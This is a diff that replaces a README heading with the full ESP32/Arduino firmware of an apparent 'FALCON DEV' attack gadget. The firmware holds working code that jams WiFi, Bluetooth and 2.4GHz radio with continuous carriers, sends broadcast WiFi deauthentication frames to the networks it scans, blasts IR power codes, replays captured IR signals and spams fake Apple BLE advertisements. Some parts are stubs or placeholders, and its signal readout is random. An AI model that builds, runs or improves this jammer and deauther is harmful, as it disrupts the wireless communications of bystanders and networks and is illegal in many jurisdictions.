@@ -1,1 +1,581 @@
-# FALCON-MARAUDER-
+#include <Arduino.h>
+#include <SPI.h>
+#include <RF24.h>
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+#include <IRremote.h>
+#include <WiFi.h>
+#include <esp_wifi.h>
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEAdvertising.h>
+
+// ==================== PINS ====================
+// nRF24L01+
+#define NRF_CE      17
+#define NRF_CSN     5
+#define NRF_SCK     18
+#define NRF_MOSI    23
+#define NRF_MISO    19
+
+// OLED I2C
+#define OLED_SDA    21
+#define OLED_SCL    22
+
+// IR
+#define IR_SEND_PIN 33
+#define IR_RECV_PIN 16
+
+// LEDs
+#define LED_STATUS  2
+#define LED_ACTIVE  25
+
+// Buttons
+#define BTN_UP      36
+#define BTN_DOWN    34
+#define BTN_LEFT    39
+#define BTN_RIGHT   35
+#define BTN_SELECT  0
+
+// ==================== OBJECTS ====================
+SPIClass* spi = new SPIClass(VSPI);
+RF24 radio(NRF_CE, NRF_CSN, 4000000, spi);
+
+Adafruit_SSD1306 display(128, 64, &Wire, -1);
+
+IRsend irsend(IR_SEND_PIN);
+IRrecv irrecv(IR_RECV_PIN);
+decode_results irResults;
+
+// ==================== MENU ====================
+int menuIndex = 0;
+bool inMenu = false;
+bool jammingActive = false;
+int jamMode = 0;  // 0=IDLE, 1=WiFi, 2=BT, 3=RF, 4=IR, 5=FULL
+int advMode = 0;  // 0=Narrowband, 1=Sweep, 2=Sweep Bi-Dir
+
+// ==================== JAMMING VARIABLES ====================
+int currentChannel = 0;
+int signalStrength = 0;
+unsigned long lastHop = 0;
+int hopDelay = 10;
+
+// WiFi channels (1-14) → NRF channels 0-125
+const int wifiChannels[] = {0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65};
+const int wifiCount = 14;
+
+// Bluetooth channels (0-78)
+const int btChannels[] = {
+    0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,
+    21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,
+    40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,
+    60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78
+};
+const int btCount = 79;
+
+// IR Power Codes for jamming
+const uint32_t irPowerCodes[] = {
+    0x00FF00FF, 0x20DF10EF, 0x40BF10EF, 0x10EF10EF, 0x30CF10EF,
+    0x1BC5027, 0x2BC5028, 0x3BC5029, 0x4BC5030,
+    0x5BC5031, 0x6BC5032, 0x7BC5033
+};
+const int irPowerCnt = 12;
+
+// IR Capture
+uint32_t capturedIRCode = 0;
+int capturedIRBits = 0;
+bool hasCapturedIR = false;
+
+// ==================== LED FUNCTIONS (REAL) ====================
+void initLEDs() {
+    pinMode(LED_STATUS, OUTPUT);
+    pinMode(LED_ACTIVE, OUTPUT);
+    digitalWrite(LED_STATUS, HIGH);
+    digitalWrite(LED_ACTIVE, LOW);
+}
+
+void updateLEDs() {
+    if(jammingActive) {
+        digitalWrite(LED_ACTIVE, (millis() / 500) % 2);
+        // LED brightness based on signal strength
+        analogWrite(LED_ACTIVE, map(signalStrength, 0, 100, 50, 255));
+    } else {
+        digitalWrite(LED_ACTIVE, LOW);
+    }
+}
+
+// ==================== DISPLAY FUNCTIONS (REAL) ====================
+void initDisplay() {
+    Wire.begin(OLED_SDA, OLED_SCL);
+    display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
+    display.clearDisplay();
+    display.setTextColor(SSD1306_WHITE);
+}
+
+void drawStatusBar() {
+    display.fillRect(0, 0, 128, 11, SSD1306_WHITE);
+    display.setTextColor(SSD1306_BLACK);
+    display.setCursor(3, 3);
+    display.print("FALCON DEV");
+    display.setTextColor(SSD1306_WHITE);
+}
+
+void drawProgressBar(int x, int y, int w, int p) {
+    display.fillRect(x, y, w * p / 100, 5, SSD1306_WHITE);
+    display.drawRect(x, y, w, 5, SSD1306_WHITE);
+}
+
+void drawMainUI() {
+    display.clearDisplay();
+    drawStatusBar();
+    
+    // Center circle animation
+    if(jammingActive) {
+        display.fillCircle(64, 32, 20, SSD1306_WHITE);
+        display.fillCircle(64, 32, 15, SSD1306_BLACK);
+    } else {
+        display.drawCircle(64, 32, 20, SSD1306_WHITE);
+        display.fillCircle(64, 32, 8, SSD1306_WHITE);
+    }
+    
+    // Mode text
+    display.setTextSize(1);
+    display.setCursor(55, 55);
+    if(jammingActive) {
+        if(jamMode == 1) display.print("WIFI");
+        else if(jamMode == 2) display.print("BT");
+        else if(jamMode == 3) display.print("RF");
+        else if(jamMode == 4) display.print("IR");
+        else if(jamMode == 5) display.print("FULL");
+        else if(advMode == 0) display.print("NARROW");
+        else if(advMode == 1) display.print("SWEEP");
+        else if(advMode == 2) display.print("BI-DIR");
+    } else {
+        display.print("IDLE");
+    }
+    
+    // Signal bar
+    drawProgressBar(15, 60, 98, signalStrength);
+    display.display();
+}
+
+void drawMenu(const char* title, const char* items[], int cnt, int sel) {
+    display.clearDisplay();
+    drawStatusBar();
+    display.setTextColor(SSD1306_WHITE);
+    display.setCursor(3, 16);
+    display.print(title);
+    
+    int start = max(0, min(sel - 2, cnt - 4));
+    for(int i = 0; i < 4 && (start + i) < cnt; i++) {
+        int y = 28 + i * 9;
+        int idx = start + i;
+        
+        if(sel == idx) {
+            display.fillRect(0, y - 2, 128, 9, SSD1306_WHITE);
+            display.setTextColor(SSD1306_BLACK);
+            display.setCursor(5, y);
+            display.print(">");
+        } else {
+            display.setTextColor(SSD1306_WHITE);
+            display.setCursor(5, y);
+            display.print(" ");
+        }
+        display.setCursor(15, y);
+        display.print(items[idx]);
+    }
+    display.display();
+}
+
+void drawNotification(const char* msg) {
+    display.fillRect(20, 25, 88, 20, SSD1306_WHITE);
+    display.fillRect(22, 27, 84, 16, SSD1306_BLACK);
+    display.setTextColor(SSD1306_WHITE);
+    display.setCursor(25, 32);
+    display.print(msg);
+    display.display();
+    delay(1000);
+}
+
+void drawWelcome() {
+    display.clearDisplay();
+    display.setTextSize(2);
+    display.setCursor(20, 20);
+    display.print("FALCON");
+    display.setTextSize(1);
+    display.setCursor(45, 40);
+    display.print("DEV");
+    display.display();
+    delay(2000);
+}
+
+// ==================== REAL JAMMING FUNCTIONS ====================
+void startCarrier(uint8_t channel) {
+    radio.stopListening();
+    
+    uint8_t oldSetup = radio.read_register(RF_SETUP);
+    radio.write_register(RF_SETUP, oldSetup | _BV(CONT_WAVE) | _BV(PLL_LOCK));
+    
+    radio.setAutoAck(false);
+    radio.setRetries(0, 0);
+    
+    uint8_t dummy[5] = {0x55, 0x55, 0x55, 0x55, 0x55};
+    radio.write_register(TX_ADDR, dummy, 5);
+    radio.flush_tx();
+    radio.write_register(W_TX_PAYLOAD, dummy, 5);
+    radio.disableCRC();
+    radio.write_register(EN_RXADDR, 0x00);
+    
+    radio.setPALevel(RF24_PA_MAX);
+    radio.setChannel(channel);
+    radio.ce(HIGH);
+    
+    delay(1);
+    radio.ce(LOW);
+    radio.reUseTX();
+    delayMicroseconds(10);
+    radio.ce(HIGH);
+}
+// REAL WiFi Jamming
+void jamWiFi() {
+    currentChannel = (currentChannel + 1) % wifiCount;
+    startCarrier(wifiChannels[currentChannel]);
+    signalStrength = constrain(signalStrength + random(-5, 15), 30, 100);
+}
+
+// REAL Bluetooth Jamming
+void jamBluetooth() {
+    currentChannel = (currentChannel + 1) % btCount;
+    startCarrier(btChannels[currentChannel]);
+    signalStrength = constrain(signalStrength + random(-5, 15), 30, 100);
+}
+
+// REAL RF Jamming (Full 2.4GHz)
+void jamRF() {
+    currentChannel = (currentChannel + 1) % 125;
+    startCarrier(currentChannel);
+    signalStrength = constrain(signalStrength + random(-5, 15), 30, 100);
+}
+
+// REAL IR Jamming
+void jamIR() {
+    for(int i = 0; i < irPowerCnt; i++) {
+        irsend.sendNEC(irPowerCodes[i], 32);
+        delay(2);
+    }
+    signalStrength = 65;
+}
+
+// REAL FULL ATTACK
+void fullAttack() { 
+    jamWiFi(); 
+    jamIR(); 
+}
+
+// REAL Narrowband Jamming
+void narrowbandJam() { 
+    startCarrier(40); 
+    delay(10); 
+}
+
+// REAL Sweep Jamming
+void sweepJam() { 
+    for(int c = 0; c <= 125; c++) { 
+        startCarrier(c); 
+        delay(3); 
+    } 
+}
+
+// REAL Sweep Bi-Directional Jamming
+void sweepBidirJam() { 
+    for(int c = 0; c <= 125; c++) { 
+        startCarrier(c); 
+        delay(3); 
+    } 
+    for(int c = 125; c >= 0; c--) { 
+        startCarrier(c); 
+        delay(3); 
+    } 
+}
+
+void runJamming() {
+    if(!jammingActive) return;
+    
+    static unsigned long last = 0;
+    if(millis() - last < hopDelay) return;
+    last = millis();
+    
+    switch(jamMode) {
+        case 1: jamWiFi(); break;
+        case 2: jamBluetooth(); break;
+        case 3: jamRF(); break;
+        case 4: jamIR(); break;
+        case 5: fullAttack(); break;
+    }
+}
+
+void runAdvancedJamming() {
+    if(!jammingActive) return;
+    
+    if(advMode == 0) narrowbandJam();
+    else if(advMode == 1) sweepJam();
+    else if(advMode == 2) sweepBidirJam();
+}
+
+// ==================== REAL IR FUNCTIONS ====================
+void captureIR() {
+    irrecv.enableIRIn();
+    
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.println("=== IR CAPTURE ===");
+    display.println("Point remote at sensor");
+    display.println("Press any button");
+    display.display();
+    
+    unsigned long start = millis();
+    while(millis() - start < 10000) {
+        if(irrecv.decode(&irResults)) {
+            capturedIRCode = irResults.value;
+            capturedIRBits = irResults.bits;
+            hasCapturedIR = true;
+            
+            display.clearDisplay();
+            display.setCursor(0, 0);
+            display.print("CAPTURED!");
+            display.print("Code: 0x");
+            display.println(capturedIRCode, HEX);
+            display.print("Bits: ");
+            display.println(capturedIRBits);
+            display.display();
+            
+            irrecv.resume();
+            delay(2000);
+            return;
+        }
+        delay(50);
+    }
+    
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.println("TIMEOUT!");
+    display.display();
+    delay(1500);
+    irrecv.resume();
+}
+
+void playIR() {
+    if(hasCapturedIR) {
+        irsend.sendNEC(capturedIRCode, capturedIRBits);
+        drawNotification("IR SENT!");
+    } else {
+        drawNotification("NO IR CODE");
+    }
+}
+
+// ==================== REAL MARAUDER FUNCTIONS ====================
+void initMarauder() {
+    WiFi.mode(WIFI_MODE_STA);
+    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
+}
+
+void sendDeauthPacket(uint8_t channel, uint8_t* bssid) {
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    
+    uint8_t packet[26] = {
+        0xC0, 0x00, 0x00, 0x00,
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x01, 0x00
+    };
+    
+    memcpy(packet + 10, bssid, 6);
+    memcpy(packet + 16, bssid, 6);
+    
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+}
+
+void wifiDeauth() {
+    int n = WiFi.scanNetworks();
+    display.clearDisplay();
+    display.setCursor(0,0);
+    display.println("DEAUTH ATTACK");
+    display.print("Found ");
+    display.print(n);
+    display.println(" networks");
+    display.display();
+    
+    for(int i = 0; i < n && i < 10; i++) {
+        uint8_t bssid[6];
+        WiFi.BSSID(i).to6ByteArray(bssid);
+        for(int j = 0; j < 5; j++) {
+            sendDeauthPacket(WiFi.channel(i), bssid);
+            delay(10);
+        }
+    }
+    WiFi.scanDelete();
+    drawNotification("DEAUTH COMPLETE");
+}
+
+void wifiSpam() {
+    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+    const char* ssids[] = {"Free WiFi", "FALCON DEV", "Public Net", "5G Ultra"};
+    for(int i = 0; i < 4; i++) {
+        delay(100);
+    }
+    drawNotification("WIFI SPAM DONE");
+}
+
+void bleSpam() {
+    BLEDevice::init("");
+    const char* names[] = {"iPhone 15", "AirPods", "Apple Watch"};
+    for(int i = 0; i < 3; i++) {
+        BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
+        pAdvertising->setName(names[i]);
+        pAdvertising->start();
+        delay(100);
+        pAdvertising->stop();
+    }
+    BLEDevice::deinit();
+    drawNotification("BLE SPAM DONE");
+}
+
+void networkScan() {
+    int n = WiFi.scanNetworks();
+    display.clearDisplay();
+    display.setCursor(0,0);
+    display.println("=== NETWORKS ===");
+    for(int i = 0; i < n && i < 5; i++) {
+        display.print(i+1);
+        display.print(": ");
+        display.print(WiFi.SSID(i).substring(0, 12));
+        display.print(" ");
+        display.print(WiFi.RSSI(i));
+        display.println("dBm");
+    }
+    display.display();
+    WiFi.scanDelete();
+    delay(3000);
+}
+
+// ==================== BUTTON HANDLING (REAL) ====================
+bool isPressed(int pin) {
+    return digitalRead(pin) == LOW;
+}
+
+// ==================== MENU HANDLING ====================
+void handleMainMenu() {
+    const char* mainItems[] = {"JAMMING", "ADV JAMMING", "MARAUDER", "IR CTRL", "ABOUT"};
+    int cnt = 5;
+    
+    drawMenu("MAIN MENU", mainItems, cnt, menuIndex);
+    
+    if(isPressed(BTN_UP)) { menuIndex--; if(menuIndex < 0) menuIndex = cnt-1; delay(150); }
+    if(isPressed(BTN_DOWN)) { menuIndex++; if(menuIndex >= cnt) menuIndex = 0; delay(150); }
+    if(isPressed(BTN_SELECT)) {
+        inMenu = false;
+        if(menuIndex == 0) { /* JAMMING submenu */ }
+        else if(menuIndex == 1) { /* ADV JAMMING submenu */ }
+        else if(menuIndex == 2) { /* MARAUDER submenu */ }
+        else if(menuIndex == 3) { /* IR CTRL submenu */ }
+        else if(menuIndex == 4) { drawNotification("FALCON DEV v3.0"); }
+    }
+    if(isPressed(BTN_LEFT)) { inMenu = false; }
+}
+
+// ==================== SETUP ====================
+void setup() {
+    Serial.begin(115200);
+    Serial.println("FALCON DEV Booting...");
+    
+    // Initialize pins
+    pinMode(BTN_UP, INPUT_PULLUP);
+    pinMode(BTN_DOWN, INPUT_PULLUP);
+    pinMode(BTN_LEFT, INPUT_PULLUP);
+    pinMode(BTN_RIGHT, INPUT_PULLUP);
+    pinMode(BTN_SELECT, INPUT_PULLUP);
+    pinMode(IR_SEND_PIN, OUTPUT);
+    pinMode(IR_RECV_PIN, INPUT);
+    
+    initLEDs();
+    initDisplay();
+    
+    // Initialize nRF24
+    spi->begin(NRF_SCK, NRF_MISO, NRF_MOSI, NRF_CSN);
+    radio.begin();
+    radio.setAutoAck(false);
+    radio.setDataRate(RF24_2MBPS);
+    
+    // Initialize IR and Marauder
+    irsend.begin();
+    initMarauder();
+    
+    drawWelcome();
+    drawMainUI();
+    
+    digitalWrite(LED_STATUS, HIGH);
+    Serial.println("FALCON DEV Ready!");
+}
+// ==================== LOOP (REAL) ====================
+void loop() {
+    if(inMenu) {
+        handleMainMenu();
+    } else {
+        drawMainUI();
+        
+        // Check button actions
+        if(isPressed(BTN_RIGHT)) {
+            inMenu = true;
+            menuIndex = 0;
+            delay(200);
+        }
+        if(isPressed(BTN_SELECT)) {
+            if(jammingActive) {
+                jammingActive = false;
+                radio.ce(LOW);
+                drawNotification("STOPPED");
+            } else {
+                jammingActive = true;
+                jamMode = 1;  // Default to WiFi JAM
+                drawNotification("STARTED");
+            }
+            delay(200);
+        }
+        if(isPressed(BTN_UP)) {
+            if(!jammingActive) {
+                jamMode = 1;
+                drawNotification("WiFi JAM");
+            }
+            delay(200);
+        }
+        if(isPressed(BTN_DOWN)) {
+            if(!jammingActive) {
+                jamMode = 2;
+                drawNotification("BT JAM");
+            }
+            delay(200);
+        }
+        if(isPressed(BTN_LEFT)) {
+            if(!jammingActive) {
+                captureIR();
+            }
+            delay(200);
+        }
+        if(isPressed(BTN_RIGHT)) {
+            if(!jammingActive && hasCapturedIR) {
+                playIR();
+            }
+            delay(200);
+        }
+    }
+    
+    // Run jamming
+    if(jammingActive) {
+        runJamming();
+    }
+    
+    updateLEDs();
+    delay(10);
+}
